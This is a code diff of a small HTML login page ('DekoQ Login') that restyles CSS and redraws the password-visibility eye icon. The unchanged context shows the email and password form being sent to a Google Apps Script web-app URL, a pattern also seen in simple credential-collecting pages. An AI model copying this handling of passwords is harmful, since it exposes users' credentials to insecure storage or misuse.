@@ -5,6 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DekoQ Login</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       padding: 0;
@@ -40,7 +44,6 @@
       box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
       width: 90%;
       max-width: 400px;
-      box-sizing: border-box;
     }
 
     form {
@@ -58,7 +61,6 @@
     input[type="email"],
     .password-wrapper {
       width: 100%;
-      position: relative;
     }
 
     input[type="email"],
@@ -68,7 +70,10 @@
       padding: 0.8rem 1.2rem;
       border: 1px solid #ccc;
       border-radius: 8px;
-      box-sizing: border-box;
+    }
+
+    .password-wrapper {
+      position: relative;
     }
 
     .password-wrapper input {
@@ -125,11 +130,9 @@
         <div class="password-wrapper">
           <input type="password" id="password" name="password" placeholder="Password" required />
           <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle password visibility">
-            <svg id="eye-icon" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-              <circle cx="32" cy="32" r="30" fill="#eee"/>
-              <circle cx="32" cy="32" r="12" fill="#555"/>
-              <path d="M22 22 Q24 18, 32 18 Q40 18, 42 22" stroke="#555" stroke-width="2" fill="none"/>
-              <path d="M22 42 Q24 46, 32 46 Q40 46, 42 42" stroke="#555" stroke-width="2" fill="none"/>
+            <svg id="eye-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z" stroke="#555" stroke-width="2"/>
+              <circle id="pupil" cx="12" cy="12" r="3" fill="#555"/>
             </svg>
           </button>
         </div>
@@ -143,6 +146,8 @@
     const form = document.querySelector("#form");
     const passwordInput = document.getElementById("password");
     const eyeIcon = document.getElementById("eye-icon");
+    const pupil = document.getElementById("pupil");
+
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
 
     form.addEventListener("submit", (e) => {
@@ -169,6 +174,9 @@
     function togglePassword() {
       const type = passwordInput.type === "password" ? "text" : "password";
       passwordInput.type = type;
+
+      // เปลี่ยนลักษณะตา
+      pupil.setAttribute("fill", type === "text" ? "#00BFFF" : "#555");
     }
   </script>
 </body>
